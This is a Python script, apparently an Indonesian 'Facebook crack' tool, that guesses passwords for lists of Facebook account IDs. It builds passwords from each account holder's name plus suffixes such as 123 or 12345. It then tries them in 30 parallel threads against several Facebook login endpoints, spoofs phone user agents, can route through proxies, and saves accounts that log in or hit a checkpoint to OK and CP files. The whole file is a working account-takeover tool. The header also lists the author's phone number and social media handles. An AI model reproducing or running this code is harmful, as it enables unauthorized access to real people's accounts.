#--> Author's Info
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'

#--> Import Module
import os, sys, requests, bs4, re, time, datetime, random
try: from crack import methode
except Exception as e: import methode
from bs4 import BeautifulSoup as bs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

#--> Style Warna
Z = '\x1b[38;5;232m' # Hitam
M = '\x1b[38;5;196m' # Merah
H = '\x1b[38;5;46m'  # Hijau
K = '\x1b[38;5;226m' # Kuning
B = '\x1b[38;5;44m'  # Biru
U = '\x1b[38;5;54m'  # Ungu
O = '\x1b[38;5;51m'  # Biru Muda
P = '\x1b[38;5;231m' # Putih
J = '\x1b[38;5;208m' # Jingga
A = '\x1b[38;5;248m' # Abu-Abu

#--> Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system('clear')
    elif "win" in sys.platform.lower():os.system('cls')

#--> Tanggal
def waktu(): # --- [ Jangan Ganti Keterangan Waktu ] --- #
    _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
    hari_ini = ("%s%s%s"%(datetime.now().day,_bulan_,datetime.now().year))
    return(str(hari_ini.lower()))

#--> Global Variable
pemisah = '|'

#--> Generate Password
def generate(nama):
    pw = []
    nl = nama.lower().split(' ')
    if len(nl) > 1:
        nd = nl[0]
        nb = nl[-1]
        if len(nd) < 3:
            pw.append(nd+'12345')
        elif 2 < len(nd) < 6:
            pw.append(nd+'123')
            pw.append(nd+'1234')
            pw.append(nd+'12345')
        else:
            pw.append(nd)
            pw.append(nd+'123')
            pw.append(nd+'1234')
            pw.append(nd+'12345')
        if len(nb) < 3:
            pw.append(nb+'12345')
        elif 2 < len(nb) < 6:
            pw.append(nb+'123')
            pw.append(nb+'1234')
            pw.append(nb+'12345')
        else:
            pw.append(nb)
            pw.append(nb+'123')
            pw.append(nb+'1234')
            pw.append(nb+'12345')
    else:
        nd = nl[0]
        if len(nd) < 3:
            pw.append(nd+'12345')
        elif 2 < len(nd) < 6:
            pw.append(nd+'123')
            pw.append(nd+'1234')
            pw.append(nd+'12345')
        else:
            pw.append(nd)
            pw.append(nd+'123')
            pw.append(nd+'1234')
            pw.append(nd+'12345')
    if len(nama) > 5:
        pw.append(nama.lower())
    # pw.append('bismillah')
    # pw.append('sayang')
    # pw.append('anjing')
    return(pw)

#--> Executor
class main:
    def __init__(self,file):
        self.lp     = 0
        self.ok     = 0
        self.cp     = 0
        self.border = M
        self.konten = P
        self.title  = P
        self.file   = file
        self.data   = []
        self.file_ok = 'OK/%s.json'%(waktu())
        self.file_cp = 'CP/%s.json'%(waktu())
        self.pilih_methode()
        self.user_agent()
        self.takon_proxy()
        self.show_saved()
        self.sort()
    def pilih_methode(self):
        y, z, q = self.border, self.konten, self.title
        print('\n%s╭────────────────────────────── [ %sMetode %s] ──────────────────────────────╮%s'%(y,q,y,P))
        print('%s│%s│'%(y,' '*72))
        print('%s│     %s[ %sAPI %s]        [ %sValidate %s]      [ %sRegular %s]      [ %sAsync %s]        │'%(y,y,z,y,z,y,z,y,z,y))
        print('%s│     %s[%s1%s] %sApi        %s[%s5%s] %sMbasic        %s[%s9%s]  %sMbasic      %s[%s13%s] %sMbasic      %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│     %s[%s2%s] %sB-Api      %s[%s6%s] %sMobile        %s[%s10%s] %sMobile      %s[%s14%s] %sMobile      %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│     %s[%s3%s] %sGraph      %s[%s7%s] %sFree          %s[%s11%s] %sFree        %s[%s15%s] %sFree        %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│     %s[%s4%s] %sB-Graph    %s[%s8%s] %sTouch         %s[%s12%s] %sTouch       %s[%s16%s] %sTouch       %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│%s│'%(y,' '*72))
        print('%s╰─ ┌─ [ %sPilih %s] ─────────────────────────────────────────────────────────╯%s'%(y,P,y,P))
        xo = input('   %s└──> %s'%(M,P))
        if xo in   ['1', '01' ,'a']:   self.mtd = 'api'                  
        elif xo in ['2', '02' ,'b']:   self.mtd = 'b-api'               
        elif xo in ['3', '03' ,'c']:   self.mtd = 'graph'                  
        elif xo in ['4', '04' ,'d']:   self.mtd = 'b-graph'         
        elif xo in ['5', '05' ,'e']:   self.mtd = 'validate_mbasic'
        elif xo in ['6', '06' ,'f']:   self.mtd = 'validate_mobile'
        elif xo in ['7', '07' ,'g']:   self.mtd = 'validate_free'    
        elif xo in ['8', '08' ,'h']:   self.mtd = 'validate_touch'   
        elif xo in ['9', '09' ,'i']:   self.mtd = 'regular_mbasic'  
        elif xo in ['10', '010' ,'j']: self.mtd = 'regular_mobile'   
        elif xo in ['11', '011' ,'k']: self.mtd = 'regular_free'     
        elif xo in ['12', '012' ,'l']: self.mtd = 'regular_touch'     
        elif xo in ['13', '013' ,'m']: self.mtd = 'async_mbasic'     
        elif xo in ['14', '014' ,'n']: self.mtd = 'async_mobile'     
        elif xo in ['15', '015' ,'o']: self.mtd = 'async_free'       
        elif xo in ['16', '016' ,'p']: self.mtd = 'async_touch'         
        else:                          self.mtd = 'validate_mobile'
    def user_agent(self):
        y, z, q = self.border, self.konten, self.title
        print('%s╭──────────────────────────── [ %sUser Agent %s] ────────────────────────────╮%s'%(y,q,y,P))
        print('%s│%s│'%(y,' '*72))
        print('%s│     %s[%s1%s] %sSamsung   %s[%s2%s] %sXiaomi   %s[%s3%s] %sRealme   %s[%s4%s] %sNokia   %s[%s0%s] %sCustom     %s│'%(y,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y,z,y))
        print('%s│%s│'%(y,' '*72))
        print('%s╰─ ┌─ [ %sPilih %s] ─────────────────────────────────────────────────────────╯%s'%(y,P,y,P))
        xo = input('   %s└──> %s'%(M,P))
        print('')
        if xo in   ['1', '01' ,'a']: self.ua_stat = 'Samsung'
        elif xo in ['2', '02' ,'b']: self.ua_stat = 'Xiaomi'     
        elif xo in ['3', '03' ,'c']: self.ua_stat = 'Realme'        
        elif xo in ['4', '04' ,'d']: self.ua_stat = 'Nokia' 
        elif xo in ['0', '00' ,'z']:
            try: os.mkdir('login')
            except Exception as e: pass
            open('login/custom_ua.json','w').write('')
            xc = input('%s[%s•%s] %sMasukkan User-Agent : %s'%(M,P,M,P,M))
            open('login/custom_ua.json','a+').write(xc)
            self.ua_stat = 'Custom'
        else: self.ua_stat = 'Samsung'
    def takon_proxy(self):
        xa = input('%s[%s•%s] %sGunakan Proxy? %s[%sy%s/%st%s] : %s'%(M,P,M,P,P,M,P,M,P,M)).lower()
        if xa in   ['1', '01' ,'y']: self.prox_con = True
        else: self.prox_con = False
    def show_saved(self):
        y, z, q = self.border, self.konten, self.title
        open(self.file_ok,'a+')
        open(self.file_cp,'a+')
        sp = 8
        aw = int(format(((64 - sp) / 2) - len(str(self.file_ok)),'.0f')) #--> Jangan Diganti Nanti Ga Presisi
        print('\n%s╭────────────────────────── [ %sFile Tersimpan %s] ──────────────────────────╮%s'%(y,q,y,P))
        print('%s│%s│'%(y,' '*72))
        print('%s│%s[ %s%s%s ]%s[ %s%s%s ]%s│'%(y,' '*(aw),z,self.file_ok,y,' '*(sp),z,self.file_cp,y,' '*(aw)))
        print('%s│%s│'%(y,' '*72))
        print('%s╰%s╯%s'%(y,'─'*(72),P))
    def sort(self):
        print('\n%s[%s•%s] %sProses Crack Dimulai...\n'%(M,P,M,P))
        with ThreadPoolExecutor(max_workers=30) as qwerty:
            for x in self.file:
                try:
                    id = x.split('|')[0]
                    lp = generate(x.split('|')[1])
                    qwerty.submit(self.crack,id,lp)
                except Exception as e:
                    pass
    def crack(self,id,ps):
        try:
            for pw in ps:
                mba = random.choice(['mbasic.facebook.com','mbasic.alpha.facebook.com','mbasic.beta.facebook.com'])
                mob = random.choice(['m.facebook.com','m.alpha.facebook.com','m.beta.facebook.com'])
                fre = random.choice(['free.facebook.com','free.alpha.facebook.com','free.beta.facebook.com'])
                tou = random.choice(['touch.facebook.com','touch.alpha.facebook.com','touch.beta.facebook.com'])
                if self.mtd   == 'api'             : log = methode.graph_new    (id,pw,'https://api.facebook.com/restserver.php',self.ua_stat,self.prox_con)
                elif self.mtd == 'b-api'           : log = methode.graph_new    (id,pw,'https://b-api.facebook.com/method/auth.login?',self.ua_stat,self.prox_con)
                elif self.mtd == 'graph'           : log = methode.graph_new    (id,pw,'https://graph.facebook.com/auth/login',self.ua_stat,self.prox_con)
                elif self.mtd == 'b-graph'         : log = methode.graph_new    (id,pw,'https://b-graph.facebook.com/auth/login',self.ua_stat,self.prox_con)
                elif self.mtd == 'validate_mbasic' : log = methode.validate_new (id,pw,mba,self.ua_stat,self.prox_con)
                elif self.mtd == 'validate_mobile' : log = methode.validate_new (id,pw,mob,self.ua_stat,self.prox_con)
                elif self.mtd == 'validate_free'   : log = methode.validate_new (id,pw,fre,self.ua_stat,self.prox_con)
                elif self.mtd == 'validate_touch'  : log = methode.validate_new (id,pw,tou,self.ua_stat,self.prox_con)
                elif self.mtd == 'regular_mbasic'  : log = methode.regular_new  (id,pw,mba,self.ua_stat,self.prox_con)
                elif self.mtd == 'regular_mobile'  : log = methode.regular_new  (id,pw,mob,self.ua_stat,self.prox_con)
                elif self.mtd == 'regular_free'    : log = methode.regular_new  (id,pw,fre,self.ua_stat,self.prox_con)
                elif self.mtd == 'regular_touch'   : log = methode.regular_new  (id,pw,tou,self.ua_stat,self.prox_con)
                elif self.mtd == 'async_mbasic'    : log = methode.async_new    (id,pw,mba,self.ua_stat,self.prox_con)
                elif self.mtd == 'async_mobile'    : log = methode.async_new    (id,pw,mob,self.ua_stat,self.prox_con)
                elif self.mtd == 'async_free'      : log = methode.async_new    (id,pw,fre,self.ua_stat,self.prox_con)
                elif self.mtd == 'async_touch'     : log = methode.async_new    (id,pw,tou,self.ua_stat,self.prox_con)
                if log['stat'] == 'cp':
                    self.cp += 1
                    pcp = ('\r   %s──> %s • %s                              '%(M,id,pw))
                    try:
                        op = open(self.file_cp,'r').read()
                        if id in op: pass
                        else: open(self.file_cp,'a+').write('%s|%s\n'%(id,pw))
                    except Exception as e:
                        pass
                    print(pcp)
                elif log['stat'] == 'ok':
                    self.ok += 1
                    pok = ('\r   %s──> %s • %s                              '%(H,id,pw))
                    try:
                        op = open(self.file_ok,'r').read()
                        if id in op: pass
                        else: open(self.file_ok,'a+').write('%s|%s\n'%(id,pw))
                    except Exception as e:
                        pass
                    print(pok)
                else:
                    # psp = ('\r   %s──> %s • %s                              '%(K,id,pw))
                    # print(psp)
                    continue
            self.lp += 1
            print('\r%sProses Crack [%s/%s] [OK:%s] [CP:%s]'%(P,str(self.lp),str(len(self.file)),str(self.ok),str(self.cp)),end=''); sys.stdout.flush()
        except requests.exceptions.ConnectionError:
            f = random.choice([M,K,J])
            print('\r%sSinyale Ilang Cok !%s                                '%(f,P),end=''); sys.stdout.flush()
            self.crack(id,ps)
        except Exception as e:
            #print(e)
            self.crack(id,ps)

if __name__ == '__main__':
    clear()
    main('')
